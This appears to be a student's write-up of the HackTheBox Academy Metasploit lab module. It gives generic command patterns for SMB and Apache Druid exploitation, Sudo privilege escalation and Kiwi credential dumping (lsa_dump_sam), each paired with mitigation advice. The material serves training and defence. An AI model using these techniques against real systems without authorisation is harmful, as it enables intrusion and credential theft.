
# Using the Metasploit Framework — HTB Academy

**Platform:** HackTheBox Academy
**Module Tier:** 0 | **Difficulty:** Easy | **Status:** ✅ Completed (10 Cubes)
**Category:** Exploitation / Penetration Testing Fundamentals

## Overview

This module covers the core workflow of the Metasploit Framework (MSF) — module
selection, payload configuration, session handling, and post-exploitation using
Meterpreter. The module is broken into four practical sections, each targeting a
different vulnerable service. Below are my methodology notes for each section —
focused on approach and technique, not full solutions or flags.

---

## Section 1 — Modules (SMB Exploitation)

**Objective:** Identify and exploit a vulnerable SMB service to gain a shell.

**Approach:**
- Started with `msfconsole -q` to launch in quiet mode.
- Used the `search` command to filter by exploit type and known vulnerability class
  (in this case, an SMB-based remote code execution vulnerability).
- Selected the relevant exploit module with `use <module_number>` or `use <path>`.
- Reviewed required options with `show options` before configuring anything.

**Generic command pattern:**
```
msfconsole -q
search type:exploit <keyword>
use <module_path>
show options
set RHOSTS <target_ip>
set LHOST <your_vpn_interface_ip>
exploit
```

**Key techniques demonstrated:**
- Filtering MSF's module database by type and platform
- Setting `LHOST` correctly when connecting through a VPN interface (tun0) rather
  than a local NIC — a common early mistake
- Verifying a shell was returned before proceeding to post-exploitation

**Mitigation (real-world):**
- Patch SMB services promptly; this vulnerability class is well-documented and has
  had official patches available for years.
- Disable SMBv1 where not required.
- Segment legacy systems that can't be patched.

---

## Section 2 — Payloads (Apache Druid Exploitation)

**Objective:** Exploit a vulnerable Apache Druid service to obtain a shell.

**Approach:**
- Searched MSF for exploit modules matching the target service and version.
- Reviewed the default payload assigned to the module (many modules default to
  `reverse_tcp` payloads) via `show payloads` and `show options`.
- Configured `RHOSTS`/`LHOST`, confirmed the payload type matched the target's
  architecture/OS, then executed.

**Generic command pattern:**
```
search apache_druid
use <module_path>
show payloads
set payload <payload_path>
set RHOSTS <target_ip>
set LHOST <your_ip>
exploit
```

**Key techniques demonstrated:**
- Understanding the difference between staged vs. non-staged payloads
- Confirming payload/target compatibility before firing an exploit
- Reading module documentation (`info`) to understand what the exploit actually does

**Mitigation:**
- Keep data services like Druid updated and never expose admin/management
  interfaces to untrusted networks.
- Apply least-privilege service accounts so a compromised process has limited reach.

---

## Section 3 — Sessions (Web App Fingerprinting + Exploitation + Privilege Escalation)

**Objective:** Identify a web application via source inspection, exploit a
matching vulnerability to get a shell, then escalate privileges via a vulnerable
Sudo version.

**Approach — fingerprinting:**
- Used `curl` against the target to inspect raw HTML/headers rather than relying
  on a browser, to quickly spot framework/application signatures.

**Approach — exploitation:**
- Searched MSF using the identified application/service name.
- Verified the target's version was actually within the vulnerable range before
  attempting exploitation (avoids wasted attempts and noisy failed sessions).
- Set required options and executed to obtain an initial shell.

**Approach — privilege escalation:**
- With a shell already open, backgrounded the session (`background` or `Ctrl+Z`)
  rather than closing it.
- Searched for a local privilege escalation module matching the Sudo version
  installed on the target — in this case a heap-based buffer overflow class.
- Selected the escalation module and pointed it at the existing session
  using `set SESSION <id>` instead of setting RHOSTS again.
- First attempt failed due to a missing `LHOST` value for the new payload —
  a good reminder that background sessions still need fresh payload config.

**Generic command pattern:**
```
curl -s http://<target_ip>/ | grep -i "generator\|powered"

search <service_name>
use <module_path>
set RHOSTS <target_ip>
set LHOST <your_ip>
exploit

sessions -l
use <privesc_module_path>
set SESSION <session_id>
set LHOST <your_ip>
exploit
```

**Key techniques demonstrated:**
- Manual service fingerprinting as a complement to automated scanning
- Session management — backgrounding and reusing active sessions
- Local privilege escalation module usage tied to a specific session ID
- Debugging a failed exploit attempt by checking payload options, not just target config

**Mitigation:**
- Keep Sudo and all privilege-adjacent binaries patched; heap overflow classes in
  Sudo have historically led to full root compromise.
- Apply the principle of least privilege — restrict sudo rules to only what's needed.

---

## Section 4 — Meterpreter (Service Enumeration + Credential Extraction)

**Objective:** Enumerate the target, exploit an identified vulnerable service,
then extract credential material via Meterpreter/Mimikatz (Kiwi).

**Approach — enumeration:**
- Ran an Nmap scan (fast mode, service/version detection, aggressive) to identify
  running services before touching MSF at all.
- Noted an uncommon service name in the results and treated it as the likely
  attack surface rather than default/common ports.

**Approach — exploitation:**
- Searched MSF using the identified service name and found a matching arbitrary
  file upload exploit.
- Set target/local host values and executed to obtain a shell.

**Approach — post-exploitation (credential access):**
- Once inside a Meterpreter session, loaded the Kiwi extension
  (Mimikatz integration) to interact with Windows credential storage.
- Used the SAM/LSA credential dumping command to pull hashed credentials for a
  specific local user rather than dumping everything indiscriminately.

**Generic command pattern:**
```
nmap -sV -F -T5 -A <target_ip>

search <service_name>
use <module_path>
set RHOSTS <target_ip>
set LHOST <your_ip>
exploit

load kiwi
lsa_dump_sam
```

**Key techniques demonstrated:**
- Nmap-first enumeration before jumping to exploit selection
- Matching an unusual/non-default service to a specific exploit module
- Meterpreter extension loading (Kiwi) for credential access
- Targeted credential dumping instead of indiscriminate extraction

**Mitigation:**
- Disable/remove unused services, especially ones with known arbitrary file
  upload vulnerabilities.
- Enforce strong password/hash storage policies and monitor for LSASS/SAM access
  attempts (EDR/SIEM alerting).
- Use Credential Guard / LSA protection on Windows hosts where possible.

---

## Overall Lessons Learned

- MSF's real value isn't "point and click" — it's knowing how to search, verify
  compatibility, and read module documentation before firing an exploit.
- `LHOST` misconfiguration (especially over VPN/tun interfaces) is one of the most
  common practical mistakes — always confirm the interface before exploiting.
- Session management (`sessions -l`, `background`, `set SESSION`) is essential once
  privilege escalation modules come into play — you don't always restart from scratch.
- Post-exploitation tooling (Kiwi/Mimikatz) should be used deliberately and
  targeted, not as a blanket dump — good habit for real engagements and reporting.
- Every exploited service in this module maps to a well-known, patchable
  vulnerability class — reinforcing that most real-world compromises come from
  missed patching and hardening, not exotic zero-days.

## Reference

Official module: HTB Academy — *Using the Metasploit Framework* 
Badge Link : https://academy.hackthebox.com/achievement/badge/c1825214-33be-11f1-9254-bea50ffe6cb4

